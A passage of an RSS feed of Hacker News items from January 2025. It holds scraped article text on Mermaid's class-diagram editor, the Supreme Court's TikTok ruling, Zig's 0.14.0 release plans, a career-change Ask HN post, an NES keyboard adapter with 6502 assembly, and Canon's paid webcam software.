https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?resize=300%2C189&amp;ssl=1 300w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?resize=1024%2C645&amp;ssl=1 1024w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?resize=768%2C484&amp;ssl=1 768w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?resize=1536%2C968&amp;ssl=1 1536w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?resize=2048%2C1291&amp;ssl=1 2048w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?resize=1200%2C756&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px"><figcaption><em>Editing Class Details</em></figcaption></figure>



<p>At the top of the dialog, you can specify the class’s annotation (such as “Abstract”) and modify its name. Below that, the interface is divided into clear sections for attributes and methods. Each class property can be precisely configured:</p>



<h4 id="attributes">Attributes:</h4>



<ul>
<li>Define visibility modifiers (like public/private using&nbsp;<code>+</code>&nbsp;or&nbsp;<code>-</code>).</li>



<li>Set the data type (such as&nbsp;<code>int</code>,&nbsp;<code>String</code>).</li>



<li>Specify the attribute name.</li>



<li>Add additional modifiers as needed.</li>
</ul>



<h4 id="methods">Methods:</h4>



<ul>
<li>Set the method visibility.</li>



<li>Define return types.</li>



<li>Specify method names and parameters.</li>



<li>Add or remove methods with intuitive controls.</li>
</ul>



<p>The editor maintains proper UML syntax automatically, handling details like the abstract class notation (shown as «Abstract» in the diagram) and proper formatting of attributes and methods. Changes are previewed in real-time, and you can either save your modifications or cancel to revert to the previous state.</p>



<p>This visual approach to class editing makes it significantly easier to maintain complex class diagrams, especially for team members who might be less familiar with Mermaid’s syntax.</p>



<h3 id="additional-tips-for-optimizing-your-diagrams"><strong>Additional Tips for Optimizing Your Diagrams</strong></h3>



<ul>
<li><strong>Experiment with Different Layouts</strong>: Play with layout and theme options to find the best look for your diagram.</li>



<li><strong>Add Context with Notes</strong>: Use the note feature to explain parts of your diagram, helping to clarify complex relationships.</li>
</ul>



<h3 id="get-started-today"><strong>Get Started Today</strong></h3>



<p>The new Mermaid Visual Editor tools make diagramming more efficient and accessible. Whether you’re building a new class diagram from scratch or refining an existing one, these updates save you time and effort, letting you focus on what truly matters: the design and structure of your system.</p>



<p>Start exploring these features today and take your class diagrams to the next level! Here’s how to get started:</p>



<ol>
<li><a href="https://www.mermaidchart.com/landing?utm_source=blog&amp;utm_medium=blog&amp;utm_campaign=erd_examples"><strong>Create your free account</strong></a>: Sign up with your email to join our Free tier.</li>



<li><strong>Start a new diagram:</strong> Open up a new diagram and click on “ER Diagram” from the Templates menu in the editor.</li>



<li><strong>Edit, tweak, and automate: </strong>Use our simple code editor (or message Mermaid AI) to fine-tune your diagram to fit your needs.</li>
</ol>



<p>We wish you luck in creating effective class diagrams!</p>
<!-- HTML_TAG_END --> <div><p>Author</p> <p>Knut Sveidqvist</p> <p>Creator of MermaidJS and founder of Mermaid Chart</p></div>  <hr></div>    </main>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Supreme Court rules to uphold TikTok ban, setting stage for shutdown (820 pts)]]></title>
            <link>https://www.cnbc.com/2025/01/17/supreme-court-rules-to-uphold-tiktok-ban.html</link>
            <guid>42738464</guid>
            <pubDate>Fri, 17 Jan 2025 15:23:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cnbc.com/2025/01/17/supreme-court-rules-to-uphold-tiktok-ban.html">https://www.cnbc.com/2025/01/17/supreme-court-rules-to-uphold-tiktok-ban.html</a>, See on <a href="https://news.ycombinator.com/item?id=42738464">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="RegularArticle-ArticleBody-5" data-module="ArticleBody" data-test="articleBody-2" data-analytics="RegularArticle-articleBody-5-2"><div id="ArticleBody-InlineImage-108086106" data-test="InlineImage"><p>Jaap Arriens | Nurphoto | Getty Images</p></div><div><p>The <a href="https://www.cnbc.com/supreme-court-us/">Supreme Court</a> on Friday upheld the law requiring China-based ByteDance to divest its ownership of TikTok by Sunday or face <a href="https://www.cnbc.com/2024/12/06/tiktok-divestment-law-upheld-by-federal-appeals-court.html">an effective ban</a> of the popular social video app in the U.S.</p><p>ByteDance has so far refused to sell TikTok, meaning many U.S. users could <a href="https://www.cnbc.com/2025/01/15/how-vpns-might-allow-americans-to-continue-using-tiktok-.html">lose access</a> to the app this weekend. The app may still work for those who already have TikTok on their phones, although ByteDance has also threatened to shut the app down.</p><p>In a unanimous decision, the Supreme Court sided with the Biden administration, upholding&nbsp;the Protecting Americans from Foreign Adversary Controlled Applications Act which President <a href="https://www.cnbc.com/joe-biden/">Joe Biden</a> <a href="https://www.cnbc.com/2024/04/24/biden-signs-israel-ukraine-tiktok-bill-into-law.html">signed</a> in April.</p><p>"There is no doubt that, for more than 170 million Americans, TikTok offers a distinctive and expansive outlet for expression, means of engagement, and source of community," the Supreme Court's opinion said. "But Congress has determined that divestiture is necessary to address its well-supported national security concerns regarding TikTok's data collection practices and relationship with a foreign adversary."</p><p>Supreme Court Justices Sonia Sotomayor and Neil Gorsuch wrote concurrences.</p><div><p><a href="https://www.cnbc.com/2024/11/13/trump-victory-may-provide-tiktok-a-lifeline-to-remain-in-the-us.html">TikTok's fate</a> in the U.S. now lies in the hands of President-elect <a href="https://www.cnbc.com/donald-trump/">Donald Trump</a>, &nbsp;who originally favored a TikTok ban during his first administration, but has since flip-flopped on the matter. In December, Trump <a href="https://www.supremecourt.gov/DocketPDF/24/24-656/336151/20241227163400981_2024-12-27%20-%20TikTok%20v.%20Garland%20-%20Amicus%20Brief%20of%20President%20Donald%20J.%20Trump.pdf" target="_blank">asked</a> the Supreme Court to <a href="https://www.nbcnews.com/politics/donald-trump/trump-urges-supreme-court-hit-pause-law-ban-tiktok-us-month-rcna185606" target="_blank">pause the law's implementation</a> and&nbsp;allow his administration "the opportunity to pursue a political resolution of the questions at issue in the case."</p><p>Trump began to speak more favorably of TikTok after he<a href="https://www.businessinsider.com/trump-tiktok-comments-meeting-with-billionaire-investor-jeff-yass-2024-3" target="_blank">&nbsp;met in February</a>&nbsp;with billionaire Republican megadonor Jeff Yass. Yass is a major ByteDance investor who also owns a stake in the owner of&nbsp;<a href="https://www.cnbc.com/quotes/DJT/">Truth Social</a>, Trump's social media platform.</p></div><p>Trump will be inaugurated on Monday, one day after the TikTok deadline for a sale.&nbsp;<a href="https://www.cnbc.com/2024/12/16/tiktok-asks-supreme-court-to-block-us-ban-pending-appeal.html">TikTok CEO Shou Chew</a> is one of several tech leaders <a href="https://www.cnbc.com/2025/01/16/tiktok-ceo-expected-to-attend-trumps-inauguration-nbc-reports.html">expected to be in attendance</a>, seated on the dais.&nbsp;</p></div><div id="Placeholder-ArticleBody-Video-108088262" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000363810" aria-labelledby="Placeholder-ArticleBody-Video-108088262"><p><img src="https://image.cnbcfm.com/api/v1/image/108088263-17371193251737119321-38026896474-1080pnbcnews.jpg?v=1737119324&amp;w=750&amp;h=422&amp;vtcrop=y" alt="It's pretty clear Trump likes TikTok and is going to save it, says LightShed's Rich Greenfield"><span></span><span></span></p></div><div><p><br>The nation's highest court said in the opinion that while "data collection and analysis is a common practice in this digital age," the sheer size of TikTok and its "susceptibility to foreign adversary control, together with the vast swaths of sensitive data the platform collects" poses a national security concern.</p><p>Under the terms of the law, third-party internet service providers like <span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-14"><a href="https://www.cnbc.com/quotes/AAPL/">Apple</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> and <span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-15"><a href="https://www.cnbc.com/quotes/GOOGL/">Google</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> will be penalized for supporting&nbsp;a ByteDance-owned&nbsp;TikTok after the Jan. 19 deadline.</p><p>If service providers and app store owners comply, consumers will unable to install the necessary updates that make the app functional.</p><p>Representatives for TikTok did not immediately respond to requests for comment.</p></div><h2><a id="headline0"></a>Users look for alternatives</h2><div><p>White House press secretary Karine Jean-Pierre reiterated President Biden's support for the law in a statement, saying "TikTok should remain available to Americans, but simply under American ownership or other ownership that addresses the national security concerns identified by Congress in developing this law."</p><p>"Given the sheer fact of timing, this Administration recognizes that actions to implement the law simply must fall to the next Administration, which takes office on Monday," Pierre said.</p><p>Kate Ruane, the director of the Center for Democracy and Technology nonprofit, criticized the decision, saying in a statement that it "harms the free expression of hundreds of millions of TikTok users in this country and around the world."</p><p>In December, members of the House Select Committee on the Chinese Communist Party <a href="https://www.cnbc.com/2024/12/13/apple-google-instructed-by-house-committee-to-prepare-to-dump-tiktok.html">sent letters</a> to Apple CEO Tim Cook and Google CEO Sundar Pichai, urging the executives to begin preparing to comply with the law.</p></div><div id="ArticleBody-InlineImage-107387732" data-test="InlineImage"><p>Shou Zi Chew, CEO of TikTok, speaks to reporters outside the office of Sen. John Fetterman (D-PA) at the Russell Senate Office Building on March 14, 2024 in Washington, DC.</p><p>Anna Moneymaker | Getty Images</p></div><div><p>Last Friday, the<a href="https://www.cnbc.com/2025/01/09/supreme-court-set-to-hear-oral-arguments-on-challenge-to-tiktok-ban.html"> Supreme Court heard oral arguments</a> from lawyers representing TikTok, content creators and the U.S. government. TikTok's lead lawyer, Noel Francisco, argued that the law violates the First Amendment rights of the app's 170 million American users. Meanwhile, U.S. Solicitor General Elizabeth Prelogar claimed that the app's alleged ties to China pose a national security threat. &nbsp;</p><p>Many TikTok creators have been telling their fans to find them on competing social platforms like Google's YouTube and <span data-test="QuoteInBody" id="RegularArticle-QuoteInBody-18"><a href="https://www.cnbc.com/quotes/META/">Meta's</a><span><span id="-WatchlistDropdown" data-analytics-id="-WatchlistDropdown"></span></span></span> Facebook and Instagram, CNBC <a href="https://www.cnbc.com/2025/01/12/tiktok-creators-ask-followers-to-migrate-ahead-of-ban-to-meta-youtube.html">reported</a>.&nbsp;Additionally, Instagram leaders scheduled meetings after last Friday's Supreme Court hearing to direct workers to prepare for a wave of users if the court upholds the law.</p><div><p>Chinese social media app and <a href="https://www.cnbc.com/2025/01/13/as-tiktok-faces-us-ban-chinasr-rednote-tops-apple-app-store.html">TikTok-lookalike RedNote rose to the top</a> of Apple's app store on Monday, indicating that TikTok's millions of users were seeking alternatives.</p><p>The Chinese government also weighed a <a href="https://www.cnbc.com/2025/01/13/china-considers-selling-tiktok-us-operations-to-musk-bloomberg-.html">contingency plan</a> that would have X owner <a href="https://www.cnbc.com/elon-musk/">Elon Musk</a> acquire TikTok's U.S. operations as part of several options intended to keep the app from its effective ban in the U.S., Bloomberg News <a href="https://www.bloomberg.com/news/articles/2025-01-14/china-discusses-sale-of-tiktok-us-to-musk-as-one-possible-option" target="_blank">reported</a> on Monday.</p></div><p>Should ByteDance decide to sell TikTok to a U.S. company or group of investors, potential buyers may have to pay between <a href="https://www.cnbc.com/2025/01/15/tiktoks-us-unit-could-be-worth-as-much-as-50-billion-in-a-sale.html">$40 billion and $50 billion</a>, according to an estimate by CFRA Research Senior Vice President Angelo Zino.</p><p><strong>WATCH</strong>: <a href="https://www.cnbc.com/video/2025/01/10/tiktok-bans-fate-is-now-in-the-supreme-courts-hands.html">SCOTUS hears TikTok ban case</a>.</p></div><div id="Placeholder-ArticleBody-Video-108085050" data-test="VideoPlaceHolder" role="region" tabindex="0" data-vilynx-id="7000363160" aria-labelledby="Placeholder-ArticleBody-Video-108085050"><p><img src="https://image.cnbcfm.com/api/v1/image/108085051-17365346511736534648-37930012242-1080pnbcnews.jpg?v=1736534650&amp;w=750&amp;h=422&amp;vtcrop=y" alt="TikTok ban's fate is now in the Supreme Court's hands"><span></span><span></span></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Interactive game teaching dark patterns in UX design (112 pts)]]></title>
            <link>https://games.productartistry.com/games/dark-patterns</link>
            <guid>42737778</guid>
            <pubDate>Fri, 17 Jan 2025 14:23:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://games.productartistry.com/games/dark-patterns">https://games.productartistry.com/games/dark-patterns</a>, See on <a href="https://news.ycombinator.com/item?id=42737778">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><a href="https://games.productartistry.com/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Games Hub</a></p><div><h2>Dark Patterns Detective</h2><div><p>Uncover the hidden design tricks that manipulate user decisions online</p><p>Every click online is a choice. But are they really yours? Play this hands-on adventure to decode the invisible design patterns steering your digital decisions.</p></div></div><div><p>By the end of this game, you will learn to:</p><div><ul><li><div><h3>Spot Manipulative Patterns</h3><p>Train your eye to identify subtle tactics used to mislead users.</p></div></li><li><div><h3>Decode Design Psychology</h3><p>Understand how design taps into human instincts to shape behavior.</p></div></li><li><div><h3>Take Back Control Online</h3><p>Become an empowered, informed user in the digital world.</p></div></li></ul></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Zig: What to Expect from Release Month (120 pts)]]></title>
            <link>https://ziglang.org/news/what-to-expect-from-release-month/</link>
            <guid>42737345</guid>
            <pubDate>Fri, 17 Jan 2025 13:35:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ziglang.org/news/what-to-expect-from-release-month/">https://ziglang.org/news/what-to-expect-from-release-month/</a>, See on <a href="https://news.ycombinator.com/item?id=42737345">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content" role="main">
    
      <p><a id="back" href="https://ziglang.org/news/">
        ← Back to
        <b>News</b>
        page
      </a></p>
    <h3>January 17, 2025</h3>
    
    <p>Hey everyone,</p><p>We've been relatively quiet over here at the Zig Software Foundation for a few months now and so it's about time to give y'all an update.</p><p>To be honest, these quiet times are my personal favorite - when the release pressure is off, there are no upcoming conferences, and there are long stretches of uninterrupted coding on big projects - the ones that require full and undivided attention for days or weeks in a row. Lately I found some <a href="https://www.youtube.com/watch?v=xZjM1trmJWA" target="_blank">lovely trance music</a> compilation albums as well as tearing through <a href="https://www.youtube.com/watch?v=Uzyii85rwqo" target="_blank">Infected</a> <a href="https://www.youtube.com/watch?v=ETzp63AdzMQ" target="_blank">Mushroom</a>'s entire catalogue, and it's been pure <a href="https://www.youtube.com/watch?v=AEm3bIBN8aQ" target="_blank">bliss</a>.</p><p>Personally, I've taken on Zig's linker code since Jakub decided to move on to other things. Loris has been working on a book, Jacob has been <a href="https://github.com/ziglang/zig/pull/22386" target="_blank">rewriting the x86 backend</a>, and Veikka has been plugging away at an official <a href="https://github.com/ziglang/translate-c/" target="_blank">translate-c package</a> that uses Aro rather than Clang. Matthew has been doing more directly visible work, making language enhancements, frontend bug fixes, as well as working steadily towards <a href="https://github.com/ziglang/zig/issues/21165" target="_blank">incremental compilation</a>. We also have <a href="https://alexrp.com/" target="_blank">a new Zig core team member</a>, who deserves his own news announcement, to follow shortly.</p><p>As satisfying as it is to work on bigger subprojects, it's time to cut a release.</p><p>Previously, I made an estimate of January 1st for the 0.14.0 tag. That estimate was based on waiting until all the LLVM bug fix patches are done, so that we don't have to cut our own bug fix releases in response to LLVM. That deadline slipped by mainly because I was caught up in <a href="https://github.com/ziglang/zig/pull/22220" target="_blank">a rather large branch</a> I wanted to finish, however, LLVM ended up making a January 14th 19.1.7 release, which is expected to be their last one in the series, so turns out we are right on schedule.</p><p>Anyway, I am now setting a hard deadline of <strong>February 17th</strong> for the 0.14.0 tag. That gives us one month to do Quality Assurance for the release. During this time I expect to shelf bigger goals, instead focusing on the Pull Request queue, which has admittedly been a bit neglected recently, as well as triaging all the open issues and putting together a realistic set of priorities to get finished before the cutoff.</p><p>One of the big pushes this release cycle was <a href="https://github.com/ziglang/zig/issues/22257" target="_blank">improving the x86 backend enough to become the default for debug builds</a>. Whether this will be accomplished by the release or not is yet to be determined. It's not out of the question, but we can't promise it either.</p><p>Another one was incremental compilation, which will not be enabled by default for the release due to lack of robust testing, however it is well within beta-testing quality, so there is a compiler flag to opt in and try it out. More details about that to come in the release notes.</p><p>Apart from those major goals, this release is nothing to sneeze at. There have been a steady stream of notable language enhancements, such as <a href="https://github.com/ziglang/zig/pull/21257" target="_blank">labeled switch continue</a>. Furthermore, Alex has poured a ton of effort into Zig's support table, so you can expect nearly every target to move up a tier.</p><p>If you have a Zig project that is pinned on Zig 0.13.0, now is a great time to upgrade to the latest master branch release. Our goal during Release Month is to ensure everyone gets a smooth upgrade, so if that is not the case for you, please speak up!</p><p>I know people are <em>itching</em> for a 1.0 tag, but there is still much to do before the project is ready for such a commitment. Instead, I would like to offer progressively more and more stable releases, to the point where people feel comfortable using them, knowing there may still be some migration needed with successive releases.</p><p>Happy hacking,</p><p>Andrew</p>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: How can I realistically change careers? (148 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=42735767</link>
            <guid>42735767</guid>
            <pubDate>Fri, 17 Jan 2025 09:41:10 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=42735767">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="42735767">
      <td><span></span></td>      <td><center><a id="up_42735767" href="https://news.ycombinator.com/vote?id=42735767&amp;how=up&amp;goto=item%3Fid%3D42735767"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=42735767">Ask HN: How can I realistically change careers?</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_42735767">111 points</span> by <a href="https://news.ycombinator.com/user?id=throw101010101">throw101010101</a> <span title="2025-01-17T09:41:10 1737106870"><a href="https://news.ycombinator.com/item?id=42735767">8 hours ago</a></span> <span id="unv_42735767"></span> | <a href="https://news.ycombinator.com/hide?id=42735767&amp;goto=item%3Fid%3D42735767">hide</a> | <a href="https://hn.algolia.com/?query=Ask%20HN%3A%20How%20can%20I%20realistically%20change%20careers%3F&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=42735767&amp;auth=0a39b5be382471e6017e794d414ec5a59f1fb4fa">favorite</a> | <a href="https://news.ycombinator.com/item?id=42735767">105&nbsp;comments</a>        </span>
              </td></tr>
    <tr><td></td></tr><tr><td colspan="2"></td><td><div><p>I’ve spent almost two decades in digital-focused roles, specialising in strategy, user research, and creating frameworks for better customer experiences (ostensibly UX I suppose).</p><p>While I’ve found the work rewarding, I feel it’s time for a significant career change—potentially outside of this domain entirely.</p><p>I’m seeking advice from others who have made mid-career transitions:</p><p>• How did you pinpoint new directions that matched your skills and interests?</p><p>• What were the most effective ways to reposition your experience in a new field?</p><p>• Are there any resources or strategies you’d recommend for upskilling or building networks?</p><p>I've often thought about cybersecurity as something I'd like to specialise in, but it seems like bootcamps and the like aren't worth the money they charge (most advice has been starting at the bottom as an IT helpdesk worker and going from there, but I'm no spring chicken anymore. But I'm not against starting at the very bottom and working my way up).</p><p>I realise this is quite a broad ask, and apologies for the throwaway. I’d appreciate any insights, especially from those who’ve shifted from established careers to something entirely different. Thanks in advance!</p></div></td></tr>        <tr><td></td></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Family Bass - Music with an NES (139 pts)]]></title>
            <link>https://www.linusakesson.net/music/family-bass/index.php</link>
            <guid>42735413</guid>
            <pubDate>Fri, 17 Jan 2025 08:54:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.linusakesson.net/music/family-bass/index.php">https://www.linusakesson.net/music/family-bass/index.php</a>, See on <a href="https://news.ycombinator.com/item?id=42735413">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>


<p><span>I connected a Family BASIC keyboard to an NES via a
bespoke adapter in order to play its unique triangle waveform live.</span></p>

<p>Here's a short technical presentation:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/j9D4a6ws6TY" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<p>And here's a performance of my NES-style tune <a href="https://www.linusakesson.net/music/platform-hopping/index.php">Platform Hopping</a>, originally
composed for the music compo at X&nbsp;2023:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/Gds1EeQGMaQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<h2>Download</h2>

<ul><li><a href="https://hd0.linusakesson.net/files/Linus%20Akesson%20-%20Platform%20Hopping%20(Family%20Bass).mp3">Linus Akesson - Platform Hopping (Family Bass).mp3</a> (MP3, 5.7&nbsp;MB)</li>
</ul>

<h2>How the adapter works</h2>

<p>As outlined in the presentation video above, the Family BASIC keyboard is
designed to plug into the expansion port of the Famicom, but I wanted to hook
it up to one of the controller ports on my NES. This called for a custom adapter.</p>

<h3>The keyboard</h3>

<p><a href="https://www.linusakesson.net/music/family-bass/bass-large.jpg"><img src="https://www.linusakesson.net/music/family-bass/bass-small.jpg"></a></p><p>The 72&nbsp;keys of the Family BASIC keyboard are wired up in a simple
matrix, nine rows by eight columns, and the columns are further subdivided into
half-columns of four bits each. During transmission, there's also a tenth row
that is left blank. This is because the protocol is designed around a 4017
decade-counter chip inside the keyboard, which is responsible for driving one
row of keys at a time. An input signal to the keyboard selects between the two
half-columns of the current row, and the same input signal also acts as a
positive-edge clock to the decade counter, advancing to the next row. After ten
positive edges, the cycle repeats. There's also a separate reset input. In
summary:</p>

<table>
<tbody><tr><th>Direction</th><th>Function</th></tr>
<tr><td>To keyboard</td><td>Reset</td></tr>
<tr><td>To keyboard</td><td>Half-row select and Clock</td></tr>
<tr><td>From keyboard</td><td>Data 1</td></tr>
<tr><td>From keyboard</td><td>Data 2</td></tr>
<tr><td>From keyboard</td><td>Data 3</td></tr>
<tr><td>From keyboard</td><td>Data 4</td></tr>
</tbody></table>

<p>(I'm ignoring a few additional signals that control two jacks at the back of
the keyboard, used for storing BASIC programs to tape and loading them
back.)</p>

<h3>The NES controller ports</h3>

<p><a href="https://www.linusakesson.net/music/family-bass/ports-large.jpg"><img src="https://www.linusakesson.net/music/family-bass/ports-small.jpg"></a></p><p>Now let's turn to the NES controller ports. Here we find two output signals
called <tt>OUT</tt> and <tt>CLK</tt> and three input signals. <tt>OUT</tt> is
actually a common signal shared by both ports, while <tt>CLK</tt> and the input
pins are available for each port separately.</p>

<p>However, the cable I'm plugging into the oddly-shaped NES port happens to be
a replacement cable for a standard controller, and the standard controllers
only make use of one of the input pins. To save cost and make the cable as
flexible as possible, only the signals that are actually used by the controller
are connected. Thus, the only signals I can use are:</p>

<table>
<tbody><tr><th>Direction</th><th>Function</th></tr>
<tr><td>From NES</td><td><tt>OUT</tt></td></tr>
<tr><td>From NES</td><td><tt>CLK</tt></td></tr>
<tr><td>To NES</td><td>Data</td></tr>
</tbody></table>

<p><tt>OUT</tt> and Data are easy to access from software running on the NES,
by writing and reading a hardware register respectively. But the <tt>CLK</tt>
signal is different: It generates a pulse every time the corresponding Data
register is read.</p>

<p>Inside each hand controller, a parallel-in, serial-out shift register chip
is connected to these three lines, so that the NES can assert <tt>OUT</tt> to
latch the status of all eight buttons into the shift register, and then read
Data eight times to clock it out, one bit at a time. Such automatic
<tt>CLK</tt> generation is handy when interfacing standard controllers, but
it's a bad fit for the protocol used by the keyboard, so we can't really make
use of this signal.</p>

<p>That leaves us with a single output line and a single input line.</p>

<h3>The serial protocol</h3>

<p>I wired <tt>OUT</tt> straight to the “Half-row select and Clock” line, which
allows me to cycle through the keyboard matrix one half-row at a time. There
was no room for the Reset signal, but I solved that in the user interface, as
explained in the video.</p>

<p>That still leaves us with four data signals coming from the keyboard, and
only a single input on the NES side. I decided to use an AVR&nbsp;ATtiny85
microcontroller to multiplex the four parallel signals into a UART-like
bitstream. This chip has five GPIO pins, which is exactly what we need.</p>

<p><a href="https://www.linusakesson.net/music/family-bass/adapter-large.jpg"><img src="https://www.linusakesson.net/music/family-bass/adapter-small.jpg"></a></p><p>Of course, a bigger microcontroller would have allowed a more sophisticated
protocol and state-machine, probably also incorporating the Reset signal to the
keyboard. But I like the compact DIL8 package.</p>

<p>The serial output works like this: First, the signal is idle (high) for a
period of at least five bit-times. This is followed by a start-bit (low) and
four data bits, and then the signal returns to idle. That way, the receiver can
wait for a sufficiently long continuous high level—guaranteed to be the idle
state—and sync up with the next transition to a low level (i.e. the start bit)
to know when the data bits are due.</p>

<p>The ATtiny85 is clocked by its internal calibrated RC oscillator and runs at
about 1&nbsp;MHz. The code is implemented in assembly language, arranged to
make each data bit exactly six cycles long, which comes out to 6&nbsp;μs.</p>

<p>Turning now to the receiving end, a PAL NES is running at 1.66&nbsp;MHz. We
first wait for a sufficiently long stretch of high level (the bit in the
register is inverted):</p>

<div><pre>        lda     #$01

waitforidle
        bit     $4017
        bne     waitforidle

        bit     $4017
        bne     waitforidle

        bit     $4017
        bne     waitforidle

        bit     $4017
        bne     waitforidle

        bit     $4017
        bne     waitforidle

        bit     $4017
        bne     waitforidle

        bit     $4017
        bne     waitforidle
</pre></div>

<p>Then we immediately busy-wait for a low level:</p>

<div><pre>waitforstart
        bit     $4017
        beq     waitforstart
</pre></div>

<p>This loop takes seven cycles per iteration, and the signal could toggle at
any time during the loop, so we now have to a jitter of up to
6&nbsp;/&nbsp;1.66&nbsp;MHz&nbsp;=&nbsp;3.6&nbsp;μs. That is well within a
bit-time; the extra margin is good to have because of the imprecise RC
oscillator.</p>

<p>Then we simply read the data bits, exactly ten NES-cycles (6.0&nbsp;μs)
apart:</p>

<div><pre>        nop		; wait 2 cycles
        bit     0	; wait 3 cycles

        lda     $4017
        nop
        sta     temp1
        lda     $4017
        nop
        sta     temp2
        lda     $4017
        sta     temp3
        lda     #$01
        and     $4017
</pre></div>

<p>...and put the bits together:</p>

<div><pre>	lsr     temp3
        rol
        lsr     temp2
        rol
        lsr     temp1
        rol
</pre></div>

<p>In the above, I've left out a bit of protective code to deal with the
situation where an interrupt occurs during our timed code. This is just a
matter of setting a flag at the beginning of the critical section, clearing it
in the interrupt handler, and checking that it's still set at the end of the
critical section. If any such interference was detected, we have to wait for
the next idle period and try again.</p>

<p><a href="https://www.linusakesson.net/music/family-bass/connected-large.jpg"><img src="https://www.linusakesson.net/music/family-bass/connected-small.jpg"></a></p><p>Posted Friday 17-Jan-2025 07:59</p>
<div>
<h3>Discuss this page</h3><p><i>There are no comments here yet.</i></p></div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[You can't use your $6,299.00 Camera as a Webcam. That will be $5 (974 pts)]]></title>
            <link>https://romanzipp.com/blog/no-you-cant-use-your-6299-canon-camera-as-a-webcam</link>
            <guid>42735393</guid>
            <pubDate>Fri, 17 Jan 2025 08:50:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://romanzipp.com/blog/no-you-cant-use-your-6299-canon-camera-as-a-webcam">https://romanzipp.com/blog/no-you-cant-use-your-6299-canon-camera-as-a-webcam</a>, See on <a href="https://news.ycombinator.com/item?id=42735393">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                <div>
                    
                    <p>
                        $30 billion company want's you to pay $5 for using your own camera as a webcam
                    </p>
                </div>

                <p><img src="https://romanzipp.com/cdn-cgi/image/width=600px,quality=90/https://cdn-a.romanzipp.com/blog/no-you-cant-use-you-900-canon-camera-as-a-webcam/canon.jpg" alt="No, you can't use your $6,299.00 Camera as a Webcam. That will be $5" loading="lazy">
                </p>
            </div><div>
            <article>
    <div>
                                    <p>Companies squeezing every last penny out out their customers is no news. And <a target="_blank" href="https://www.digitalcameraworld.com/features/has-canon-stopped-putting-its-customers-first">Canon</a> <a target="_blank" href="https://petapixel.com/2024/07/21/canon-doesnt-win-on-price-technology-or-public-opinion/">is</a> <a target="_blank" href="https://petapixel.com/2024/08/13/canon-says-its-not-blocking-third-party-batteries-in-the-r5-ii/">no</a> <a target="_blank" href="https://petapixel.com/2022/09/06/canon-confirms-its-going-after-lens-makers-for-patent-infringement/">stranger</a>.</p><p>Last year, I've bought a Canon G5 X II camera which I wanted to use mainly for taking pictures at concerts. For me, it was the perfect match of focal range (<em>zoom</em>) and sensor size (<em>more light</em>) for any compact camera I've compared. </p><p>Because I'm only using this camera for a small range of events, it's just collecting dust in the meantime. </p><p>So, why don't <strong>use it as a webcam with my Macbook</strong>?</p><p>Admittedly, it did not cost me the $6300 from the article's title, much closer to $900. Nonetheless, everything I'm describing translates to every other Canon camera model!</p><h2>Problems Problems Problems</h2><p>I've tried this at first in 2024 with macOS 14, which did not work. I <a target="_blank" href="https://romanzipp.com/blog/fujifilm-webcam-x-macos-issues">had similar experience</a> with FUJIFILM's X Webcam software where either the camera will not get recognized by the software or the camera feed will freeze or simply be not available within other apps.</p><p>As of January 2025 with macOS 15 Sequoia, these issues have been resolved for me.</p><p>Well actually, only if you are able to <strong>download the software at all</strong>. Seems like their Microsoft IIS server is having some issues. The following error page will be presented to you, after they asked you for your full legal name and mail address - without which you can not download the software.</p>

                            <figure>
